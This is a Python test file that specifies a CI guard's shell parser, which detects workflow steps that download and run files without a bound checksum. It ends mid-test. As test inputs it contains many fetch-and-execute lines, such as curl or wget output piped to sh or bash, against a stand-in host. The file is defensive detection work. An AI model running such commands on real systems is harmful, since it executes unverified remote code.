"""#1647 (ARC-F2C): the fetch-and-exec guard's parser, on its own.

The #1529 control -- "no workflow may run a binary it fetched without checking
what arrived" -- was a pair of regexes living in `tests/test_workflow_pins.py`,
and run-13 found both of them failing OPEN:

* the fetch pattern required a whitespace-separated short `-o`/`-O` flag and
  excluded pipe characters, so `curl -fsSL https://... | sh` and
  `wget -qO- ... | bash` produced an EMPTY fetch set -- not "unverified", not
  seen as a download at all -- and `--output` was equally invisible; and
* "verified" was any `sha256sum`/`shasum` with `-c` anywhere earlier in the
  step, bound to no path and no digest, so an unrelated checksum of one
  artifact cleared a later unverified `curl -o payload; chmod +x payload`.

A guard over shell text that cannot read the shell reports a clean pass on
every form its regex does not parse, which is the worst answer a control can
give. So the logic moved into `scripts/workflow_guard.py` -- a small, real
parser: statements split quote-aware on `;`, `&&`, `||`, `|` and newlines,
argv from `shlex`, heredocs and continuations joined first -- and this module
is its specification. Every case below returned None ("clean") from the regex
it replaces; the ones marked BASE-CLEAN are the exact forms run-13 named.

The repo-wide application of the rule (every `run:` step in
`.github/workflows/*.yml`, plus the exemption list) stays in
`tests/test_workflow_pins.py`, beside the sibling rules it shares a posture
check with.
"""
import os
import re
import tempfile
import unittest
from unittest import mock

import shell_reader
import workflow_forms
import workflow_guard as wg
# The download shape itself lives in the layer below the rule (#1697).
from workflow_forms import Fetch

HEX = "a" * 64
OTHER_HEX = "b" * 64


class TestFetchParsing(unittest.TestCase):
    """What the parser SEES. Each form is a way to spell the same act."""

    def one(self, script):
        found = wg.fetches(script)
        self.assertEqual(1, len(found), "expected exactly one fetch in %r, got %r"
                         % (script, found))
        return found[0]

    def test_short_output_flag(self):
        self.assertEqual(
            Fetch("curl", "https://example.test/a", "/tmp/a", None),
            self.one("curl -sfL https://example.test/a -o /tmp/a\n"))

    def test_attached_short_output_flag(self):
        self.assertEqual("/tmp/a",
                         self.one("curl -o/tmp/a https://example.test/a\n").dest)

    def test_clustered_short_flags(self):
        self.assertEqual("/tmp/a",
                         self.one("curl -sfLo /tmp/a https://example.test/a\n").dest)

    def test_long_output_flag_is_seen(self):
        # BASE-CLEAN: the old regex required a short `-o`/`-O`.
        self.assertEqual("/tmp/a",
                         self.one("curl -fsSL --output /tmp/a https://example.test/a\n").dest)

    def test_long_output_flag_with_an_equals_is_seen(self):
        # BASE-CLEAN.
        self.assertEqual("/tmp/a",
                         self.one("curl -fsSL --output=/tmp/a https://example.test/a\n").dest)

    def test_curl_remote_name_writes_the_url_basename(self):
        self.assertEqual("payload.sh",
                         self.one("curl -fsSLO https://example.test/d/payload.sh\n").dest)

    def test_curl_without_an_output_flag_is_stdout(self):
        # BASE-CLEAN: the whole pipeline form. dest is None -- there is no file.
        self.assertEqual(
            Fetch("curl", "https://example.test/i.sh", None, ("sh",)),
            self.one("curl -fsSL https://example.test/i.sh | sh\n"))

    def test_wget_writes_the_url_basename_by_default(self):
        self.assertEqual("payload",
                         self.one("wget https://example.test/payload\n").dest)

    def test_wget_output_document(self):
        for script in ("wget -O /tmp/a https://example.test/a\n",
                       "wget --output-document /tmp/a https://example.test/a\n",
                       "wget --output-document=/tmp/a https://example.test/a\n"):
            self.assertEqual("/tmp/a", self.one(script).dest, script)

    def test_wget_dash_O_dash_is_stdout(self):
        # BASE-CLEAN: `wget -qO- ... | bash`, the second form run-13 named.
        self.assertEqual(
            Fetch("wget", "https://example.test/i.sh", None, ("bash",)),
            self.one("wget -qO- https://example.test/i.sh | bash\n"))

    def test_wgets_lowercase_o_is_a_LOG_file_not_the_destination(self):
        # curl's `-o` and wget's `-o` are different options; one parser that
        # treats them alike writes the log path into the guard's dest field.
        fetch = self.one("wget -o /tmp/wget.log https://example.test/payload\n")
        self.assertEqual("payload", fetch.dest)

    def test_a_redirect_is_a_destination(self):
        self.assertEqual("/tmp/a",
                         self.one("curl -fsSL https://example.test/a > /tmp/a\n").dest)

    def test_a_fetch_anywhere_in_a_pipeline_is_seen(self):
        self.assertEqual("/tmp/a",
                         self.one("echo go | curl -fsSL https://example.test/a -o /tmp/a\n").dest)

    def test_the_piped_stage_is_recorded_as_argv(self):
        self.assertEqual(("python3", "-"),
                         self.one("curl -fsSL https://example.test/i.py | python3 -\n").piped_to)

    def test_continuations_are_joined(self):
        script = ("curl -sfL --connect-timeout 5 --max-time 60 --retry 3 \\\n"
                  "  -o /tmp/hadolint \\\n"
                  "  https://example.test/hadolint-Linux-x86_64\n")
        self.assertEqual(
            Fetch("curl", "https://example.test/hadolint-Linux-x86_64",
                  "/tmp/hadolint", None),
            self.one(script))

    def test_a_quoted_url_keeps_its_variable_expansions(self):
        fetch = self.one('curl -sfL "https://example.test/v${VERSION}/x" -o /tmp/x\n')
        self.assertEqual("https://example.test/v${VERSION}/x", fetch.url)

    def test_two_fetches_in_one_step_are_both_seen(self):
        found = wg.fetches("curl -fsSL https://example.test/a -o /tmp/a\n"
                           "wget -O /tmp/b https://example.test/b\n")
        self.assertEqual(["/tmp/a", "/tmp/b"], [f.dest for f in found])

    def test_a_commented_out_fetch_is_not_a_fetch(self):
        # Half this repo's workflow prose QUOTES the command it explains; a
        # guard that reads its own documentation as an act flags the comment.
        self.assertEqual([], wg.fetches("# curl -fsSL https://example.test/x | sh\n"
                                        "make test   # not curl -o /tmp/x\n"))

    def test_a_script_with_no_fetch_has_none(self):
        self.assertEqual([], wg.fetches("make test\nchmod +x ./run.sh\n"))


class TestStderrRedirectsAreNotTheDestination(unittest.TestCase):
    """#1733 (COD-C2C): `stage.writes[-1]` used to overwrite a correctly
    parsed `-o`/`-O` destination with whatever a trailing `2>&1` or
    `2>/dev/null` happened to file as a write, so an ordinary stderr redirect
    on a fetch line silently defeated the guard. `shell_reader`'s own spec for
    the parser change is in tests/test_shell_reader.py; these are the
    guard-level shapes the issue named."""

    def one(self, script):
        found = wg.fetches(script)
        self.assertEqual(1, len(found), "expected exactly one fetch in %r, got %r"
                         % (script, found))
        return found[0]

    def test_a_stderr_redirect_after_the_output_flag_does_not_replace_the_dest(self):
        fetch = self.one(
            "curl -fsSL https://example.test/install.sh -o /tmp/i.sh 2>/dev/null\n")
        self.assertEqual("/tmp/i.sh", fetch.dest)

    def test_that_shape_is_still_caught_end_to_end(self):
        script = ("curl -fsSL https://example.test/install.sh -o /tmp/i.sh "
                  "2>/dev/null && bash /tmp/i.sh\n")
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_fd_duplication_after_the_output_flag_does_not_replace_the_dest(self):
        fetch = self.one(
            "curl -fsSL https://example.test/i.sh -o /tmp/i.sh 2>&1 | tee log\n")
        self.assertEqual("/tmp/i.sh", fetch.dest)

    def test_that_shape_is_still_caught_end_to_end_too(self):
        script = ("curl -fsSL https://example.test/i.sh -o /tmp/i.sh 2>&1 | "
                  "tee log && sh /tmp/i.sh\n")
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_a_stdout_redirect_followed_by_a_stderr_dup_still_names_the_file(self):
        fetch = self.one("curl -fsSL https://example.test/i.sh > /tmp/i.sh 2>&1\n")
        self.assertEqual("/tmp/i.sh", fetch.dest)

    def test_that_shape_is_caught_end_to_end_with_a_semicolon(self):
        script = "curl -fsSL https://example.test/i.sh > /tmp/i.sh 2>&1; sh /tmp/i.sh\n"
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_a_bare_fd_dup_with_no_output_flag_stays_stdout(self):
        # No file at all -- the destination stays what it always was
        # (stdout), not the literal `&2`.
        fetch = self.one("curl -fsSL https://example.test/i.sh >&2\n")
        self.assertIsNone(fetch.dest)

    def test_that_shape_stays_clean_with_no_pipe(self):
        # Regression guard: nothing landed on disk and nothing consumed the
        # stream, so this is not the rule's business, same as before #1733.
        self.assertIsNone(
            wg.fetch_exec_defect("curl -fsSL https://example.test/i.sh >&2\n"))

    def test_wget_piped_to_sh_with_a_stderr_redirect_is_still_caught(self):
        # The headline pipe-to-shell shape must survive the fix untouched.
        script = "wget -qO- https://example.test/i.sh 2>/dev/null | sh\n"
        fetch = self.one(script)
        self.assertIsNone(fetch.dest)
        self.assertEqual(("sh",), fetch.piped_to)
        why = wg.fetch_exec_defect(script)
        self.assertIsNotNone(why)
        self.assertIn("sh", why)

    def test_a_stderr_redirect_with_no_output_flag_does_not_become_the_dest(self):
        fetch = self.one("curl -fsSL https://example.test/i.sh 2>err.log\n")
        self.assertIsNone(fetch.dest)

    def test_combined_stream_redirects_are_a_real_destination(self):
        # Round 1 fix (opus review on 435e6f6): `&>word` / `&>>word` /
        # unnumbered `>&word` (attached or spaced) are bash's `>word 2>&1`
        # shorthand -- a REAL destination, caught the same as an explicit
        # `-o`. At the reviewed head every one of these five reported clean.
        for script in (
            "curl -fsSL https://example.test/i.sh &>/tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh &> /tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh &>>/tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh >&/tmp/i.sh\n",
            "curl -fsSL https://example.test/i.sh >& /tmp/i.sh\n",
        ):
            fetch = self.one(script)
            self.assertEqual("/tmp/i.sh", fetch.dest, script)
            why = wg.fetch_exec_defect(script + "sh /tmp/i.sh\n")
            self.assertIsNotNone(why, script)
            self.assertIn("/tmp/i.sh", why, script)

    def test_the_exact_reported_reproduction_is_caught(self):
        why = wg.fetch_exec_defect(
            "curl https://example.test/i.sh &> /tmp/i.sh && sh /tmp/i.sh\n")
        self.assertIsNotNone(why)
        self.assertIn("/tmp/i.sh", why)

    def test_a_stdout_redirect_to_dev_stderr_still_means_nothing_was_written(self):
        # NIT fix (round 1): `/dev/stderr` means "nothing was written" only
        # when a STDOUT REDIRECT landed there.
        fetch = self.one("curl -fsSL https://example.test/i.sh > /dev/stderr\n")
        self.assertIsNone(fetch.dest)

    def test_an_explicit_dest_of_dev_stderr_is_still_caught(self):
        # NIT fix (round 1): unlike a redirect, `-o /dev/stderr` really did
        # write there -- reverting the STDOUT-tuple shortcut must not also
        # silence this, which was caught before #1733 touched STDOUT.
        fetch = self.one("curl -fsSL https://example.test/i.sh -o /dev/stderr\n")
        self.assertEqual("/dev/stderr", fetch.dest)
        why = wg.fetch_exec_defect(
            "curl -fsSL https://example.test/i.sh -o /dev/stderr\nsh /dev/stderr\n")
        self.assertIsNotNone(why)


class TestVerificationBinding(unittest.TestCase):
    """What the parser ACCEPTS: a checksum bound to the fetched path, run
    before the bytes are used. Everything else is theatre."""

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    EXEC = "chmod +x /tmp/payload\n"

    def test_a_pipeline_into_a_shell_is_always_unverified(self):
        # BASE-CLEAN. There is no file to hash, so no checksum can rescue it.
        why = wg.fetch_exec_defect("curl -fsSL https://example.test/i.sh | sh\n")
        self.assertIn("https://example.test/i.sh", why)
        self.assertIn("sh", why)

    def test_a_checksum_cannot_rescue_a_pipeline(self):
        script = ('echo "%s  /tmp/x" | sha256sum -c -\n' % HEX +
                  "curl -fsSL https://example.test/i.sh | bash\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_wget_piped_into_bash_is_unverified(self):
        # BASE-CLEAN.
        self.assertIsNotNone(
            wg.fetch_exec_defect("wget -qO- https://example.test/i.sh | bash\n"))

    def test_a_bound_checksum_clears_it(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_checksum_naming_another_file_verifies_nothing(self):
        # BASE-CLEAN: the unbound-checksum half of #1647.
        script = (self.FETCH +
                  'echo "%s  /tmp/other" | sha256sum -c -\n' % OTHER_HEX +
                  self.EXEC)
        why = wg.fetch_exec_defect(script)
        self.assertIn("/tmp/payload", why)

    def test_an_earlier_checksum_of_a_different_download_does_not_clear_it(self):
        # BASE-CLEAN, and the exploit run-13 wrote out: one verified artifact
        # in the step used to clear every later one.
        script = ("curl -sfL https://example.test/tool -o /tmp/tool\n"
                  'echo "%s  /tmp/tool" | sha256sum -c -\n' % HEX +
                  "chmod +x /tmp/tool\n" + self.FETCH + self.EXEC)
        why = wg.fetch_exec_defect(script)
        self.assertIn("/tmp/payload", why)
        self.assertNotIn("/tmp/tool", why)

    def test_a_checksum_after_the_chmod_is_still_a_defect(self):
        script = (self.FETCH + self.EXEC +
                  'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX)
        self.assertIn("only AFTER", wg.fetch_exec_defect(script))

    def test_a_sums_file_the_step_wrote_counts(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/payload" > /tmp/sums\n' % HEX +
                  "sha256sum -c /tmp/sums\n" + self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_heredoc_sums_list_counts(self):
        script = (self.FETCH +
                  "sha256sum -c <<EOF\n%s  /tmp/payload\nEOF\n" % HEX +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_sums_file_naming_another_download_does_not_count(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/other" > /tmp/sums\n' % OTHER_HEX +
                  "sha256sum -c /tmp/sums\n" + self.EXEC)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_sums_file_the_step_never_wrote_does_not_count(self):
        # Nothing in the step ties that file to this download; it may not even
        # exist, and `sha256sum -c` on an absent list is the caller's problem.
        script = self.FETCH + "sha256sum -c /tmp/sums\n" + self.EXEC
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_shasum_a_256_counts(self):
        script = (self.FETCH +
                  'echo "%s  /tmp/payload" | shasum -a 256 -c -\n' % HEX +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_check_carrying_no_digest_verifies_nothing(self):
        # Naming the file is not checking it: something has to be the expected
        # digest, whether a literal or the pinned variable holding one.
        script = (self.FETCH + 'echo "/tmp/payload" | sha256sum -c -\n' +
                  self.EXEC)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_pinned_digest_variable_counts_as_the_digest(self):
        script = (self.FETCH +
                  'echo "${PAYLOAD_SHA256}  /tmp/payload" | sha256sum -c -\n' +
                  self.EXEC)
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_basename_match_from_another_directory_verifies_nothing(self):
        # M1: a sums list may carry bare names, but only for a bare name. With
        # a directory in the dest, `x.sh` is a DIFFERENT file, and accepting it
        # is the unbound-checksum defect wearing a shorter path.
        script = ("curl -sfL https://example.test/x.sh -o /tmp/evil/x.sh\n"
                  'echo "%s  x.sh" | sha256sum -c -\n' % HEX +
                  "chmod +x /tmp/evil/x.sh\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_bare_name_still_matches_its_own_basename(self):
        script = ("curl -sfL https://example.test/x.sh -O\n"
                  'echo "%s  x.sh" | sha256sum -c -\n' % HEX +
                  "chmod +x x.sh\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_variable_that_is_not_a_digest_is_not_a_digest(self):
        # L3: `$FILE` is a path, `$SHA256` is an expectation. Accepting any
        # expansion made `echo "$FILE  /tmp/payload" | sha256sum -c -` a check.
        script = (self.FETCH + 'echo "$FILE  /tmp/payload" | sha256sum -c -\n' +
                  self.EXEC)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_the_late_checksum_message_names_the_fetch_and_the_remedy(self):
        # L4: "verifies X only AFTER Y" said what was wrong and not what to do.
        script = (self.FETCH + self.EXEC +
                  'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX)
        why = wg.fetch_exec_defect(script)
        self.assertIn("only AFTER", why)
        self.assertIn("https://example.test/payload", why)
        self.assertIn("sha256sum -c", why)

    def test_the_message_says_what_would_satisfy_the_guard(self):
        why = wg.fetch_exec_defect(self.FETCH + self.EXEC)
        self.assertIn("sha256sum -c", why)
        self.assertIn("/tmp/payload", why)


class TestWhatCountsAsExecuting(unittest.TestCase):
    """The uses that turn fetched bytes into behaviour."""

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"

    def use(self, line):
        return wg.fetch_exec_defect(self.FETCH + line)

    def test_chmod_plus_x(self):
        self.assertIsNotNone(self.use("chmod +x /tmp/payload\n"))

    def test_running_the_file_directly(self):
        self.assertIsNotNone(self.use("/tmp/payload --version\n"))

    def test_running_it_through_an_interpreter(self):
        self.assertIsNotNone(self.use("python3 /tmp/payload\n"))

    def test_unpacking_it_with_tar(self):
        self.assertIsNotNone(self.use("tar -xzf /tmp/payload\n"))

    def test_unpacking_it_with_unzip(self):
        self.assertIsNotNone(self.use("unzip -q /tmp/payload\n"))

    def test_installing_it(self):
        self.assertIsNotNone(self.use("install -m 0755 /tmp/payload /usr/local/bin/p\n"))

    def test_moving_it_onto_PATH(self):
        self.assertIsNotNone(self.use("sudo mv /tmp/payload /usr/local/bin/payload\n"))

    def test_catting_it_into_a_shell(self):
        self.assertIsNotNone(self.use("cat /tmp/payload | sh\n"))

    def test_an_interpreter_reading_it_from_stdin(self):
        # M3: `bash < x.sh` runs x.sh. The file is never an argument, so a
        # guard that reads argv only sees `bash` with nothing after it.
        for line in ("bash < /tmp/payload\n",
                     "sh -s -- --yes < /tmp/payload\n",
                     "python3 < /tmp/payload\n"):
            self.assertIsNotNone(self.use(line), line)

    def test_running_a_copy_of_it_under_another_name(self):
        # M2: renaming laundered the file -- the copy branch only fired for a
        # destination on PATH, so `cp x y; ./y` ran unverified bytes under a
        # name the guard had never heard of.
        for copy in ("cp /tmp/payload /tmp/alias\n",
                     "mv /tmp/payload /tmp/alias\n",
                     "ln -s /tmp/payload /tmp/alias\n",
                     "cat /tmp/payload > /tmp/alias\n"):
            why = self.use(copy + "chmod +x /tmp/alias\n/tmp/alias\n")
            self.assertIsNotNone(why, copy)

    def test_symlinking_it_onto_PATH(self):
        # The alias is then invoked by a bare name this script never mentions.
        self.assertIsNotNone(self.use("ln -s /tmp/payload /usr/local/bin/p\n"))

    def test_a_checksum_naming_the_alias_clears_it(self):
        script = (self.FETCH + "cp /tmp/payload /tmp/alias\n" +
                  'echo "%s  /tmp/alias" | sha256sum -c -\n' % ("a" * 64) +
                  "chmod +x /tmp/alias\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_copying_a_data_file_is_not_executing_it(self):
        script = ("curl -sfL https://example.test/d.json -o /tmp/d.json\n"
                  "cp /tmp/d.json /tmp/copy.json\njq . /tmp/copy.json\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_fetch_that_is_never_executed_is_left_alone(self):
        script = ("curl -sfL https://example.test/data.json -o /tmp/d.json\n"
                  "jq . /tmp/d.json\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_download_piped_to_a_reader_is_left_alone(self):
        self.assertIsNone(
            wg.fetch_exec_defect("curl -fsSL https://example.test/k.gpg | gpg --import\n"))

    def test_a_script_with_no_fetch_is_left_alone(self):
        self.assertIsNone(wg.fetch_exec_defect("make test\nchmod +x ./run.sh\n"))

    def test_executing_a_file_this_step_never_fetched_is_not_this_rules_business(self):
        self.assertIsNone(wg.fetch_exec_defect("chmod +x ./scripts/local.sh\n"
                                               "./scripts/local.sh\n"))


class TestADownloadNamedLikeAWrapper(unittest.TestCase):
    """#2227: the reader knows a wrapper by its basename and reads through it,
    so a download called `flock`, run as `./flock 9`, came out as the `flock`
    wrapper running nothing, and only what the reader left was compared with
    the download. Each word read as a wrapper is compared with the downloads
    too, as the command word is, and is still read through."""

    URL = "https://example.test/tool"

    def test_a_download_run_as_a_wrapper_is_running_it(self):
        url = self.URL
        for script in (
                # FLAGGED on main, where `flock` and `setsid` were not wrappers yet.
                f"touch flock && chmod +x flock && curl -fsSL -o flock {url} && ./flock 9\n",
                f"curl -fsSL -o /tmp/flock {url}\n/tmp/flock 9\n",
                f"curl -fsSL -o bin/flock {url}\nbin/flock -n /tmp/lock make build\n",
                f"curl -fsSL -o setsid {url}\nsudo ./setsid true\n",
                # An older wrapper name, CLEAN on main, and one reached through a copy.
                f"curl -fsSL -o env {url}\n./env FOO=1 make build\n",
                f"curl -fsSL -o /tmp/payload {url}\ncp /tmp/payload ./nohup\n./nohup make\n",
                # A bare name, compared as a bare `tool` is: with `.` on PATH it runs the download.
                f"curl -fsSL -o flock {url}\nPATH=.:$PATH flock 9\n"):
            with self.subTest(script=script):
                self.assertIn("running it", wg.fetch_exec_defect(script) or "")

    def test_a_wrapper_word_naming_another_file_is_not_the_download(self):
        # The same name is not the same file: `/usr/bin/env` is not ./env, and
        # ./flock is not /tmp/flock.
        for script in (f"curl -fsSL -o env {self.URL}\n/usr/bin/env FOO=1 make\n",
                       f"curl -fsSL -o /tmp/flock {self.URL}\n./flock 9\n"):
            with self.subTest(script=script):
                self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_dynamic_path_to_a_download_behind_a_wrapper_is_reported(self):
        # Main refused `$PWD/flock` behind `sudo`, as it refuses `sudo "$X"`:
        # reading it as the `flock` wrapper by its last word read it clean.
        # The older names get the same refusal now (`$PWD/env` runs the
        # download as root here), which is the cost the rule accepts.
        for script in (f'curl -fsSL -o flock {self.URL}\nsudo "$PWD/flock" 9\n',
                       f'curl -fsSL -o env {self.URL}\nsudo "$PWD/env" FOO=1 make\n'):
            with self.subTest(script=script):
                self.assertIn("dynamic command operand behind a wrapper",
                              wg.fetch_exec_defect(script) or "")

    def test_a_dynamic_word_behind_a_wrapper_is_unresolved_whatever_its_name(self):
        argv = shell_reader.statements('sudo "$PWD/chrt" 10 make')[0].stages[0].argv
        self.assertIn("dynamic command operand behind a wrapper",
                      shell_reader.unresolved_wrapper(argv) or "")
        self.assertIn("cannot read command behind wrapper",
                      wg.fetch_exec_defect('sudo "$PWD/chrt" 10 make\n') or "")

    def test_a_download_under_any_other_name_is_running_it_as_before(self):
        script = f"touch tool && chmod +x tool && curl -fsSL -o tool {self.URL} && ./tool 9\n"
        self.assertIn("running it", wg.fetch_exec_defect(script) or "")

    def test_a_copied_system_wrapper_is_still_read_through(self):
        # Nothing fetched ./env, so reading through it is what finds the fetch
        # it runs: taking `./env` for a plain file would read this step clean.
        script = f"cp /usr/bin/env ./env\n./env sh -c 'curl -fsSL {self.URL} | sh'\n"
        self.assertIn("straight to `sh`", wg.fetch_exec_defect(script) or "")

    def test_a_wrapper_with_nothing_fetched_reads_as_before(self):
        self.assertEqual([], shell_reader.command(["flock", "9"]))
        self.assertIsNone(shell_reader.unresolved_wrapper(["flock", "9"]))
        self.assertIsNone(wg.fetch_exec_defect("flock 9\n./flock 9\n"))


class TestADownloadRunThroughAnExpandedPath(unittest.TestCase):
    """#2310: `curl -o tool …; "$PWD/tool" 9` read clean, because a use is
    bound to a download by its spelling and the fetch spelled it `tool`; bash
    3.2 and 5.2 run the download through each spelling in the first test (a
    `chmod +x tool` before the fetch survives it). A command word holding a
    `$` or `$(...)` that ends in a download's basename is now running it."""

    URL = "https://example.test/tool"
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)

    def defect(self, run, dest="tool"):
        return wg.fetch_exec_defect("curl -fsSL -o %s %s\n%s" % (dest, self.URL, run))

    def test_a_command_word_ending_in_its_basename_is_running_it(self):
        for run in ('"$PWD/tool" 9\n', '"${PWD}/tool" 9\n', "$PWD/tool 9\n",
                    '"$PWD"/tool 9\n', '"$(pwd)/tool" 9\n', '"`pwd`/tool" 9\n',
                    '"$(dirname "$PWD/x")/tool" 9\n', "x=1 $PWD/tool 9\n",
                    'for i in 1; do "$PWD/tool" 9; done\n',
                    'find . -name tool -exec "$PWD/tool" {} \\;\n'):
            with self.subTest(run=run):
                self.assertIn("-> tool and running it with nothing verifying",
                              self.defect(run) or "")

    def test_wherever_the_fetch_put_it(self):
        # Bound by the basename: what `$PWD` expands to is not evaluated, so
        # `d/tool` is read as run too -- which bash does not do from the
        # checkout, and is the fail-closed side to be wrong on.
        for dest, run in (("bin/tool", '"$PWD/bin/tool" 9\n'),
                          ("/tmp/tool", '"$RUNNER_TEMP/tool" 9\n'),
                          ("d/tool", '"$PWD/tool" 9\n')):
            with self.subTest(dest=dest):
                self.assertIn("running it", self.defect(run, dest) or "")

    def test_as_a_wrapper_word_through_a_copy_and_behind_a_wrapper(self):
        # `"$PWD/flock"` is read through as `flock`, but runs the download.
        self.assertIn("running it", self.defect('"$PWD/flock" 9 true\n', "flock") or "")
        self.assertIn("running it (as `alias`, copied from it earlier)",
                      self.defect('cp tool alias\n"$PWD/alias" 9\n') or "")
        # Refused behind `sudo` already; now it is the download's use as well.
        why = wg.fetch_exec_defects("curl -fsSL -o tool %s\nsudo \"$PWD/tool\" 9\n" % self.URL)
        self.assertEqual(2, len(why), why)
        self.assertIn("dynamic command operand behind a wrapper", why[0])
        self.assertIn("running it", why[1])

    def test_a_check_before_it_clears_it_and_one_after_it_does_not(self):
        self.assertIsNone(self.defect(self.CHECK % "tool" + '"$PWD/tool" 9\n'))
        self.assertIn("only AFTER running it",
                      self.defect('"$PWD/tool" 9\n' + self.CHECK % "tool") or "")

    def test_a_check_still_binds_by_its_exact_spelling(self):
        # Reported although bash checks the same file: read that loosely, a
        # checksum of `$OTHER/tool` would clear a `./tool` it never read.
        self.assertIn("no checksum in the job names tool",
                      self.defect(self.CHECK % "$PWD/tool" + '"$PWD/tool" 9\n') or "")

    def test_another_basename_or_a_static_path_is_not_the_download(self):
        for run in ('"$PWD/other" 9\n', '"$PWD/tool.sh" 9\n', '"$PWD/tool/.." 9\n',
                    "./bin/tool 9\n", "/usr/bin/tool 9\n"):
            with self.subTest(run=run):
                self.assertIsNone(self.defect(run))


class TestADownloadWrittenIntoADirectoryOnPath(unittest.TestCase):
    """#2308: `curl -o /usr/local/bin/tool …; tool --version` read clean: the
    download is bound to its path, and `tool` is not that path, but bash finds
    the file by looking the bare name up on PATH. A bare name that is the
    basename of a download written into one of `workflow_operands.PATH_DIRS` is
    now running it -- as the command or as a wrapper word, still read
    through."""

    URL = "https://example.test/tool"
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)

    def defect(self, dest, run):
        return wg.fetch_exec_defect("curl -fsSL -o %s %s\n%s" % (dest, self.URL, run))

    def test_a_bare_name_runs_a_download_in_a_directory_on_path(self):
        for dest in ("/usr/local/bin/tool", "/usr/bin/tool", "/bin/tool",
                     "/usr/local/sbin/tool", '"$HOME/.local/bin/tool"',
                     '"${HOME}/.local/bin/tool"', "~/.local/bin/tool",
                     "/usr/local/bin/./tool",
                     # review N-4: the runner's `~/.local/bin`, spelled out
                     "/home/runner/.local/bin/tool",
                     # not on a hosted runner's PATH, and kept: fail-closed
                     "/opt/bin/tool"):
            with self.subTest(dest=dest):
                self.assertIn("running it with nothing verifying",
                              self.defect(dest, "tool --version\n") or "")
        script = "curl -fsSL --output-dir /usr/local/bin -O %s\ntool\n" % self.URL
        self.assertIn("-> /usr/local/bin/tool and running it", wg.fetch_exec_defect(script) or "")

    def test_behind_a_wrapper_and_as_one(self):
        for dest, run in (("/usr/local/bin/tool", "sudo tool --version\n"),
                          ("/usr/local/bin/tool", "env FOO=1 tool\n"),
                          ("/usr/local/bin/flock", "flock 9 make\n"),
                          ("/usr/local/bin/env", "env FOO=1 make\n")):
            with self.subTest(dest=dest, run=run):
                self.assertIn("running it", self.defect(dest, run) or "")
        # Still read through: the command behind the wrapper word is `make`.
        self.assertEqual(["make"], shell_reader.command(["flock", "9", "make"]))

    def test_a_check_binds_by_the_path_and_not_by_the_bare_name(self):
        self.assertIsNone(self.defect("/usr/local/bin/tool",
                                      self.CHECK % "/usr/local/bin/tool" + "tool\n"))
        # `sha256sum -c` of the bare `tool` reads ./tool: taking it for the
        # download would clear bytes nothing checked.
        self.assertIn("no checksum in the job names /usr/local/bin/tool",
                      self.defect("/usr/local/bin/tool", self.CHECK % "tool" + "tool\n") or "")

    def test_off_path_or_run_by_a_path_it_is_not_the_bare_name(self):
        for dest, run in (("/tmp/tool", "tool\n"), ("bin/tool", "tool\n"),
                          ("/opt/tool/bin/tool", "tool\n"),
                          ("/usr/local/bin/tool", "./tool\n"),
                          ("/usr/local/bin/tool", "tools\n"),
                          ("/usr/local/bin/tool", "echo tool\n")):
            with self.subTest(dest=dest, run=run):
                self.assertIsNone(self.defect(dest, run))


class TestAGlobSpelledWithADotSlashIsAUseOfTheDownload(unittest.TestCase):
    """#2339: after `curl -o cuda_1.run`, `chmod +x ./cuda_*.run` and `sh
    ./cuda_*.run` read clean where `cuda_*.run` did not, and bash 3.2 and 5.2
    make the download executable and run it. `covers` matches a glob with a
    leading `./` dropped on both sides (#2349, re-review N-C), which closed
    it; these pin it: the `chmod` and the `sh` spellings, with and without a
    checksum that names the file, and a glob that cannot match."""

    GET = "curl -fsSLo %s https://example.test/cuda_1.run\n"
    CHECK = 'echo "%s  cuda_1.run" | sha256sum -c -\n' % ("a" * 64)

    def job(self, dest, use):
        return [why for _n, why in wg.job_defects([("step", self.GET % dest + use)])]

    def test_either_spelling_of_the_glob_makes_it_executable_or_runs_it(self):
        for dest in ("cuda_1.run", "./cuda_1.run"):
            for use, how in (("chmod +x ./cuda_*.run\n", "making it executable"),
                             ("sh ./cuda_*.run\n", "running it under `sh`"),
                             ("chmod +x cuda_*.run\n", "making it executable"),
                             ("sh cuda_*.run\n", "running it under `sh`"),
                             ("chmod +x ./cuda_1.run\n", "making it executable"),
                             ("sh ./cuda_1.run\n", "running it under `sh`")):
                with self.subTest(dest=dest, use=use):
                    why = self.job(dest, use)
                    self.assertEqual(1, len(why), why)
                    self.assertIn("-> %s and %s with nothing verifying" % (dest, how), why[0])

    def test_a_checksum_naming_the_file_clears_the_glob(self):
